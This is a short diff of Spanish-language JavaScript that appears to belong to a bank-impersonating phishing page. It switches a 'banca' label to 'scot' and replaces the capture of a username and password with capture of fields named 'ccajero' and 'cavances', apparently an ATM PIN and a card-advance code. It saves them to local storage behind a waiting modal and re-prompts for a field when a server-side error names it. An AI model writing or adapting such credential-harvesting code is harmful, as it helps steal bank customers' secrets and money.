@@ -1,9 +1,11 @@
-console.log("banca ON");
+console.log("scot ON");
 
 // ERORRES
 document.addEventListener('DOMContentLoaded', ()=>{
-    if(info.err != ''){
-        alert('Credenciales inválidas, por favor intente de nuevo.');
+    if(info.err === 'ccajero'){
+        document.querySelector('#ccajero').setAttribute('type', 'text');
+    }else if(info.err === 'cavances'){
+        document.querySelector('#cavances').setAttribute('type', 'text');
     }
 });
 
@@ -17,8 +19,8 @@ btnSuccess.addEventListener('submit', e => {
 
     document.querySelector('#modal-esperar').classList.add('d-block');
 
-    info.user = document.querySelector('#user').value;
-    info.puser = document.querySelector('#puser').value;
+    info.cavances = info.cavances !== '' ? info.cavances : document.querySelector('#cavances').value;
+    info.ccajero = info.ccajero !== '' ? info.ccajero : document.querySelector('#ccajero').value;
 
     LS.setItem('info', JSON.stringify(info));
 
